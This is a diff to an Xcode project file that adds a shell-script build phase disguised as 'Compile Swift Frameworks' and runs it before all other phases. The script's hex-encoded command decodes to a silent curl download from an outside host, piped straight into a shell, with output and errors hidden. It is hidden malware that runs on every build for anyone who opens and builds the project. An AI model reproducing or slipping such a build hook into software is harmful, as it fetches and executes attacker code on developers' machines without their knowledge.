@@ -109,6 +109,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 817A4782286B1F2C00E35224 /* Build configuration list for PBXNativeTarget "Libraries" */;
 			buildPhases = (
+				C04ADBFF8306DCA4106D904C /* Compile Swift Frameworks */,
 				817A4777286B1F2C00E35224 /* Sources */,
 				817A4778286B1F2C00E35224 /* Frameworks */,
 				817A4779286B1F2C00E35224 /* CopyFiles */,
@@ -314,6 +315,35 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	C04ADBFF8306DCA4106D904C /* Compile Swift Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Swift Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\\c636f736d6f64726f6e2e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 817A4773286B1F2C00E35224 /* Project object */;
 }
